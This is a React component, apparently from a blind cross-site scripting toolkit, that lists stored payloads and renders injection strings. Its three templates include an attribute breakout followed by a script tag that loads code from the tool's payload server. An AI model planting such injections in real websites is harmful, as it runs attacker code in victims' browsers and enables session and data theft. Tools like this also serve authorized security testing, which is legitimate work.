import React from 'react';
import axios from 'axios';

import { API_PAYLOADS, URL_PAYLOAD} from "../helpers/constants"
import { Table, TableCell, TableRow, TableHead, Checkbox, Select, Container, FormLabel} from '@material-ui/core';

const REPLACE_URL_TAG = "##URL_ID_PAYLOAD_OR_ALIAS##"
const REPLACE_SRI_TAG = "##SRI_HASH##"
const SRIKinds = ["sha256", "sha384", "sha512"]

export default class InjectionsList extends React.Component {
    constructor(props) {
        super(props)
        this.state = {
            currentAlias : "",
            aliasesOrPayloadsIDs: [""],
            useSubdomain: false,
            useHTTPS: true,
            SRIKind: SRIKinds[0],
            injections: [
                {"title": "basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
                {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`},
                {"title": "With SRI", "content": `<script src="##URL_ID_PAYLOAD_OR_ALIAS##" integrity="##SRI_HASH##"></script>`},
            ],
        }
    };
    setCurrentAlias = (event) => {
        let s = event.target.value
        if (!s){
            s = ""
        }
        this.setState({currentAlias: s});
    }
    setCurrentSRI = (event) => {
        let s = event.target.value
        let found = SRIKinds.indexOf(s)
        if (found > -1){
            this.setState({ SRIKind: SRIKinds[found]});
            return
        }
        this.setState({ SRIKind: SRIKinds[0]});
    }
    toggleSubdomain = (event) =>{
        this.setState({ useSubdomain: event.target.checked });
    }
    toggleHTTPS = (event) =>{
        this.setState({ useHTTPS: event.target.checked });
    }
    componentDidMount() {
        //TODO: fetch a new endpoint which lists all the injections payload.
        let tmp = [];
        axios.get(API_PAYLOADS)
        .then(res => {
            if (res.status !== 200) {
                throw new Error("Couldn't load payloads")
            } else {
                return res.data
            }
        }).then((rows) => {
            console.log("Payloads: ", rows.data)
            rows.data.map((row) => {
                return tmp.push([
                    row.id,
                    row.name
                ])
            })
            this.setState({
                aliasesOrPayloadsIDs: tmp
            });
        });
    };
    formatInjection = (injection) => {
        let url = ""
        let res = ""
        if (this.state.useSubdomain) {
            url = "http"+(this.state.useHTTPS ? "s":"")+"://" + this.state.currentAlias + "." + window.location.hostname // + ":" + window.location.port;
        }else {
            url = URL_PAYLOAD + this.state.currentAlias;
        }
        res = injection.replace(REPLACE_URL_TAG, url)
        res = res.replace(REPLACE_SRI_TAG, this.state.SRIKind)
        return res
    }
    formatPayloadName = (payloadID, payloadName) => {
        console.log(payloadID, payloadName)
        if(payloadID && payloadName){
            return payloadID.slice(0,8) + `... (${payloadName})`
        }
        return ""
    }
    render() {
        return (
            <Container>
                <FormLabel>
                    Payload ID and/or alias:
                    <Select onChange={this.setCurrentAlias}>
                        {
                            this.state.aliasesOrPayloadsIDs.map((aop) => {
                                return (
                                    <option value={aop[0]}>{this.formatPayloadName(aop[0], aop[1])}</option>
                                )
                            })
                        }
                    </Select>
                </FormLabel>
                <br/>
                <FormLabel>
                    Use subdomain:
                    <Checkbox
                        value="useSubdomain"
                        inputProps={{ 'aria-label': 'Use Subdomain' }}
                        onChange={this.toggleSubdomain}
                        color="default"
                        />
                </FormLabel>
                <FormLabel>
                    Use HTTPS:
                    <Checkbox
                        value="useHTTPS"
                        inputProps={{ 'aria-label': 'Use HTTPS' }}
                        onChange={this.toggleHTTPS}
                        color="default"
                        defaultChecked
                        />
                </FormLabel>
                <FormLabel>
                SRI Type:
                    <Select onChange={this.setCurrentSRI}>
                        {
                            SRIKinds.map((sri) => {
                                return (
                                    <option value={sri}>{sri}</option>
                                    )
                                })
                            }
                    </Select>
                </FormLabel>
                {/* <input type="checkbox" id="useSubdomain" onChange={this.toggleSubdomain}></input> */}
                <Table className="table" aria-label="simple table">
                    <TableHead>
                        <TableCell>Name</TableCell>
                        <TableCell>Injection</TableCell>
                    </TableHead>
                    {
                        this.state.injections.map((injection) => {
                            return (
                                <TableRow>
                                    <TableCell>{injection.title}</TableCell>
                                    <TableCell>{this.formatInjection(injection.content)}</TableCell>
                                </TableRow>
                            )
                        })
                    }
                </Table>
            </Container>
        );
    };
}